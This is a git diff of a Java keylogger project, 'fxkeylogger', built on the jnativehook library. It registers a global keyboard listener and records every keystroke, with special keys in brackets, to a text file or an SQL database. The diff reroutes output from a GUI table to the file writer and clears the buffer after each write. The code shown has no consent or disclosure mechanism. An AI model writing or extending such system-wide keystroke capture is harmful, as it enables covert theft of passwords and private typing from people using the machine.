@@ -2,6 +2,7 @@ package ch.fxlogger.fxkeylogger;
 
 import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
+import org.jnativehook.NativeInputEvent;
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 
@@ -24,8 +25,6 @@ public class KeyLogger implements NativeKeyListener {
     private static final Path file = Paths.get("src/main/java/ch/fxlogger/fxkeylogger/keys.txt");
 
     private static String log = "";
-    private boolean st, ctrl, alt, capslock;
-
     public void setHelloApplication(HelloApplication helloApplication) {
         this.helloApplication = helloApplication;
     }
@@ -89,12 +88,12 @@ public class KeyLogger implements NativeKeyListener {
 
         if (keyText.length() > 1) {
             log = log + "[" + keyText + "]";
-            timeSheetController.addTable(new Info(getDate(),"[" + keyText + "]", getTime()));
-            //writer.print("[" + keyText + "]");
+            //timeSheetController.addTable(new Info(getDate(),"[" + keyText + "]", getTime()));
+            writer.print("[" + keyText + "]");
         } else {
             log = log + keyText;
-           timeSheetController.addTable(new Info(getDate(),keyText, getTime()));
-            //writer.print(keyText);
+            //timeSheetController.addTable(new Info(getDate(),keyText, getTime()));
+            writer.print(keyText);
         }
     }
     private String getTime() {
@@ -117,8 +116,10 @@ public class KeyLogger implements NativeKeyListener {
     }
 
     public void write(){
+        System.out.println(writingInWhat);
         if(writingInWhat == 0){
-            writer.print(log);
+
+            writer.write(log);
         }
         else if(writingInWhat == 1){
             SQLDatabaseConnection sqlDatabaseConnection = new SQLDatabaseConnection();
@@ -126,5 +127,6 @@ public class KeyLogger implements NativeKeyListener {
             sqlDatabaseConnection.createTable();
             sqlDatabaseConnection.writeIntoDatabase(log);
         }
+        log = "";
     }
 }
